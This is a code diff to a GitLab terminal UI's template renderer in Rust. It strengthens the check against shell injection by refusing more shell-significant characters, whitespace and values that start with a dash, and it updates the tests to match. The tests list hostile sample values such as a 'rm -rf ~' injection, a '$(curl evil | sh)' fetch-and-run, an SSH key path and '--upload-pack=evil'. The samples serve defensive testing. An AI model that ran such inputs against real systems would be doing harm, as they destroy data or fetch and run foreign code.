@@ -45,11 +45,15 @@ const LIST_VIEW_CODE_KEYS: &[(&str, &str)] = &[
 /// Global bindings that act only inside an overlay, never on the list view.
 const OVERLAY_ONLY_GLOBAL_ACTIONS: &[&str] = &["submit_edit"];
 
-/// Characters that end a quoted string or start a command substitution,
-/// separator or redirection in a POSIX shell. A template value holding one
-/// could run commands the user never wrote, so it is refused.
-const SHELL_METACHARACTERS: &[char] =
-    &['`', '$', ';', '&', '|', '<', '>', '(', ')', '\\', '"', '\''];
+/// Characters a POSIX shell, bash or zsh acts on in an unquoted word: quoting,
+/// substitution, separators, redirection, globbing, brace and tilde expansion,
+/// comments and assignments. A template value holding one could run commands
+/// or pass words the user never wrote, so it is refused. Whitespace and
+/// control characters, which split words or end the command, are refused too.
+const SHELL_SIGNIFICANT_CHARACTERS: &[char] = &[
+    '`', '$', ';', '&', '|', '<', '>', '(', ')', '\\', '"', '\'', '~', '*', '?', '[', ']', '{',
+    '}', '#', '=',
+];
 
 const ENVIRONMENT_PREFIX: &str = "GLAB_TUI_";
 
@@ -619,7 +623,8 @@ impl TemplateValues {
 }
 
 /// Substitutes `values` into `template`. Fails when a referenced argument is
-/// unavailable or holds a shell metacharacter.
+/// unavailable, starts with `-`, or holds whitespace or a character the shell
+/// interprets, since issue titles and branch names are third-party text.
 pub fn render(template: &str, values: &TemplateValues) -> Result<String, String> {
     let mut rendered = String::with_capacity(template.len());
     for segment in parse_template(template)? {
@@ -637,12 +642,18 @@ pub fn render(template: &str, values: &TemplateValues) -> Result<String, String>
             }
             None => return Err(format!("{{{{.{argument}}}}} is unavailable here")),
         };
-        if let Some(unsafe_char) = value
-            .chars()
-            .find(|c| SHELL_METACHARACTERS.contains(c) || c.is_control())
-        {
+        if value.starts_with('-') {
             return Err(format!(
-                "{{{{.{argument}}}}} contains the shell metacharacter {unsafe_char:?}; \
+                "{{{{.{argument}}}}} starts with '-', so the command could read it as an option; \
+                 pass -- \"${}\" in the command instead",
+                environment_variable(argument)
+            ));
+        }
+        if let Some(unsafe_char) = value.chars().find(|c| {
+            SHELL_SIGNIFICANT_CHARACTERS.contains(c) || c.is_whitespace() || c.is_control()
+        }) {
+            return Err(format!(
+                "{{{{.{argument}}}}} contains {unsafe_char:?}, which the shell would interpret; \
                  use \"${}\" in the command instead",
                 environment_variable(argument)
             ));
@@ -1129,34 +1140,62 @@ command = "true"
     }
 
     /// A title or a fork's branch name is attacker-controlled text; spliced
-    /// raw into `sh -c` it could run commands the user never wrote.
+    /// raw into `sh -c` it could run commands or pass words the user never
+    /// wrote.
     #[test]
-    fn render_refuses_values_that_could_escape_into_the_shell() {
-        for hostile in [
-            "x'; rm -rf ~ #",
-            "$(curl evil | sh)",
-            "`id`",
-            "a && b",
-            "a\nb",
-            "say \"hi\"",
+    fn render_refuses_values_the_shell_would_interpret() {
+        for (hostile, offending) in [
+            ("x';rm", "'\\''"),
+            ("$(curl)", "'$'"),
+            ("`id`", "'`'"),
+            ("a&&b", "'&'"),
+            ("a\nb", "'\\n'"),
+            ("say\"hi\"", "'\"'"),
+            ("fix crash", "' '"),
+            ("a\tb", "'\\t'"),
+            ("~/.ssh/authorized_keys", "'~'"),
+            ("*", "'*'"),
+            ("file?", "'?'"),
+            ("[WIP]", "'['"),
+            ("x]", "']'"),
+            ("{a,b}", "'{'"),
+            ("crash#12", "'#'"),
+            ("PATH=/tmp", "'='"),
         ] {
-            let result = render(
-                "echo '{{.IssueTitle}}'",
-                &values(&[("IssueTitle", hostile)]),
+            assert_eq!(
+                render("echo {{.IssueTitle}}", &values(&[("IssueTitle", hostile)])),
+                Err(format!(
+                    "{{{{.IssueTitle}}}} contains {offending}, which the shell would interpret; \
+                     use \"$GLAB_TUI_ISSUE_TITLE\" in the command instead"
+                )),
+                "value {hostile:?}"
             );
-            let error = result.expect_err(hostile);
-            assert!(
-                error.contains("\"$GLAB_TUI_ISSUE_TITLE\""),
-                "error must point at the safe variable: {error}"
+        }
+    }
+
+    #[test]
+    fn render_refuses_values_that_start_with_a_dash() {
+        for hostile in ["-o", "--upload-pack=evil", "-"] {
+            assert_eq!(
+                render(
+                    "some-tool {{.IssueTitle}}",
+                    &values(&[("IssueTitle", hostile)])
+                ),
+                Err(
+                    "{{.IssueTitle}} starts with '-', so the command could read it as an option; \
+                     pass -- \"$GLAB_TUI_ISSUE_TITLE\" in the command instead"
+                        .to_string()
+                ),
+                "value {hostile:?}"
             );
         }
         assert_eq!(
             render(
-                "echo {{.IssueTitle}}",
-                &values(&[("IssueTitle", "[WIP] Fix crash #12, 100% done!")])
+                "git switch {{.HeadRefName}}",
+                &values(&[("HeadRefName", "fix/crash-12")])
             )
             .as_deref(),
-            Ok("echo [WIP] Fix crash #12, 100% done!")
+            Ok("git switch fix/crash-12")
         );
     }
 
